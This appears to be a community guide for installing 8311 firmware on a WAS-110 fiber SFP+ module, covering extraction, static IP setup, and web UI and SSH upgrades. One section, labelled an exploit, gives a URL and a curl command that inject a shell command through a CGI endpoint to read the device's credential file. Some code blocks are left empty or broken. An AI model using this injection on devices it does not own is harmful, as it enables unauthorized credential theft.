# Install 8311 community firmware on the BFW Solutions WAS-110

![WAS-110 community](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_firmware.webp){ class="nolightbox" }
<!-- more -->

Out of the box, the WAS-110 is not fully compatible with varying ISP OLT configurations, with issues ranging from 
vendor-specific managed entities to VEIP to IEEE standards such as [802.1X] and [802.1ad]. Due to these 
incompatibilities and discovered bugs, a community firmware[^1] has been curated to fix any impeding issues[^2]. 

  [802.1X]: https://en.wikipedia.org/wiki/IEEE_802.1X
  [802.1ad]: https://en.wikipedia.org/wiki/IEEE_802.1ad

## Host setup

Plug the WAS-110 into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network
switch.

!!! note "Rx loss"
    The WAS-110 running the default Azores firmware will trigger RX_LOS if the SC/APC fiber cable is unplugged or 
    inactive. Some host interfaces will enter a power-saving state, making the WAS-110 inaccessible.

### Download firmware

The community firmware comes in two (2) variants: *basic* and *bfw*; for the purposes of this guide, we'll focus on
the recommended <ins>basic</ins> firmware, which can be downloaded at:

<https://github.com/djGrrr/8311-was-110-firmware-builder/releases/latest>

The *basic* firmware is based on a vanilla MaxLinear [OpenWrt] 19.07 build from [Potrontec]. Additionally, it 
includes customized luci web interfaces for hassle-free masquerading and the aforementioned fixes. And unlike the *bfw* 
variant, it does not include the abysmal BFW patches and cruft.

  [OpenWrt]: https://openwrt.org/
  [Potrontec]: https://www.potrontec.com/

### Extract download

The firmware files are archived by [7-Zip] and can be extracted with:

  [7-Zip]: https://www.7-zip.org/

=== ":fontawesome-brands-windows: Windows"

    ``` sh
    7z x WAS-110_8311_firmware_mod_<version>_basic.7z
    ```

=== ":material-apple: macOS"

    !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"

    ``` sh
    brew install sevenzip
    7zz x WAS-110_8311_firmware_mod_<version>_basic.7z
    ```

=== ":material-linux: Linux"

    !!! note "The following commands assume a Debian-based distribution"

    ``` sh
    sudo apt-get install 7zip-full
    7z x WAS-110_8311_firmware_mod_<version>_basic.7z #(1)!
    ```

    1. Replace `<version>` with the downloaded version.

### Set a static IP

The default IP address of the WAS-110 is `192.168.11.1/24`. To connect successfully, a static IP address must be assigned
to the host interface, such as `192.168.11.2/24`[^3].

=== ":fontawesome-brands-windows: Windows"

    !!! tip "Run Command Prompt as Administrator"

        1. Press <kbd>Win</kbd> + <kbd>R</kbd>
        2. In the Run dialog box, type `cmd` into the input field and then press
           <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>. 

    ``` sh hl_lines="2"
    netsh interface ip show config
    netsh interface ipv4 set address name="<interface name>" static 192.168.11.2 255.255.255.0 192.168.11.1
    netsh interface ipv4 set interface "<interface name>" mtu=1500
    ```

## Web UI upgrade <small>recommended</small> { #web-ui-upgrade data-toc-label="Web UI upgrade" }

### Web credentials

The default web credentials can be found in `/ptrom/ptconf/param_ct.xml`. Modifications from the web UI are stored in
`/ptrom/ptconf/usrconfig_conf` as base64 encoded strings.

!!! warning
    Passwords have a maximum length of 16 characters which are not restricted by the web UI.

??? bug "Exploit to disclose the default web credentials"
    
    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to:

    <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>

    Alternatively, run the following command to download `param_ct.xml` to a temporary directory.

    === ":fontawesome-brands-windows: Windows"

        ``` sh
        dir %Temp% && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
        ```

        ```

    === ":material-linux: Linux"

### Firmware upgrade

!!! danger "Proceed with caution!"
    The WAS-110 firmware upgrade utility on occasion has been known to soft-brick itself. To recover, a host device 
    with serial breakout on SFP pins 2 (rx) and 7 (tx) will be required.

    Alternatively, jump past to the <ins>safer</ins> [shell upgrade](#shell-upgrade) method later in this guide.

![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)


1. Within a web browser, navigate to 
   <https://192.168.11.1/html/main.html#admin/upgrade>
   and, if asked, input the <em>admin</em> credentials. 

![WAS-110 firmware upgrade](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_upgrade.webp)

2. At the __Firmware Upgrade__ page, browse for `local-upgrade.img` from the extracted download, and click 
   __Upgrade__.

Patiently wait out the process, 4 to 5 minutes, or until the web session becomes unresponsive.

??? tip "Run a continuous ping"
    To recieve an early indication that the WAS-110 has completed its upgrade reboot cycle, run a continuous ping:

    === ":fontawesome-brands-windows: Windows"

        ``` sh
        ping -t 192.168.11.1
        ```

    === ":material-apple: macOS / :material-linux: Linux"

        ``` sh
        ping 192.168.11.1
        ```

Once rebooted, begin to enjoy the fruits of the 8311 community. It is not at all possible without the help and support
of every one of us.

        ```

### Local upgrade

The extracted `local-upgrade.tar` includes a <ins>safer</ins> upgrade script in comparison to the built-in web UI.

<h4>Enable SSH</h4>

SSH must be enabled from the web UI prior to running the shell commands.

![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)

1. Within a web browser, navigate to 
   <https://192.168.11.1/html/main.html#service/servicecontrol>
   and, if asked, input the <em>admin</em> credentials. 

![WAS-110 services](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_services.webp)

2. From the __Service Control__ page, check the __SSH__ checkbox and click __Save__.

<h4>Upgrade firmware</h4>

Run the following commands from the host terminal to upgrade to the 8311 community firmware.

=== ":fontawesome-brands-windows: Windows"

    ``` sh
    scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 "tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar"
    ```

=== ":material-apple: macOS / :material-linux: Linux"

    ``` sh
    scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
    ```
